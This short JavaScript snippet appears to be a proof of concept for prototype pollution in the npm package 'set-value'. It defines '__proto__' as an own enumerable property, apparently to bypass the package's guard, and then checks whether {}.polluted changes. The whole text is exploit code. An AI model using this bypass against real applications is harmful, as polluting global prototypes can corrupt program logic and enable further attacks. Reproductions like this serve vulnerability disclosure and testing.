var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const setFn = require('set-value');
const paths = ['__proto__.polluted'];
var obj = {};
console.log({}.polluted);
setFn(obj, paths[0], 'yes');
console.log({}.polluted);